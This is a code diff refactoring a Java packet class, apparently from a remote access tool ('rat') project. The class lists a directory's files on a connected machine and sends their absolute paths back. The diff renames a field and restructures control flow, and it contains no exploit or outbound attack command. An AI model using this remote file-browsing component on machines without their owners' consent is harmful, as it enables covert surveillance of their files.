@@ -9,8 +9,7 @@ import de.sogomn.rat.ActiveConnection;
 public class FileRequestPacket extends AbstractPingPongPacket {
 	
 	private String rootFile;
-	
-	private String[] paths;
+	private String[] childrenPaths;
 	
 	private static final byte INCOMING = 1;
 	private static final byte END = 0;
@@ -20,7 +19,7 @@ public class FileRequestPacket extends AbstractPingPongPacket {
 		this.rootFile = rootFile;
 		
 		type = REQUEST;
-		paths = new String[0];
+		childrenPaths = new String[0];
 	}
 	
 	public FileRequestPacket() {
@@ -36,7 +35,7 @@ public class FileRequestPacket extends AbstractPingPongPacket {
 	
 	@Override
 	protected void sendData(final ActiveConnection connection) {
-		for (final String path : paths) {
+		for (final String path : childrenPaths) {
 			connection.writeByte(INCOMING);
 			connection.writeUtf(path);
 		}
@@ -59,8 +58,10 @@ public class FileRequestPacket extends AbstractPingPongPacket {
 			pathList.add(path);
 		}
 		
-		paths = new String[pathList.size()];
-		paths = pathList.toArray(paths);
+		final int length = pathList.size();
+		
+		childrenPaths = new String[length];
+		childrenPaths = pathList.toArray(childrenPaths);
 	}
 	
 	@Override
@@ -75,14 +76,15 @@ public class FileRequestPacket extends AbstractPingPongPacket {
 			children = file.listFiles();
 		}
 		
-		if (children != null) {
-			paths = Stream
-					.of(children)
-					.map(File::getAbsolutePath)
-					.toArray(String[]::new);
+		if (children == null) {
+			return;
 		}
 		
 		type = DATA;
+		childrenPaths = Stream.of(children)
+				.map(File::getAbsolutePath)
+				.toArray(String[]::new);
+		
 		connection.addPacket(this);
 	}
 	
@@ -92,7 +94,7 @@ public class FileRequestPacket extends AbstractPingPongPacket {
 	}
 	
 	public String[] getPaths() {
-		return paths;
+		return childrenPaths;
 	}
 	
 }
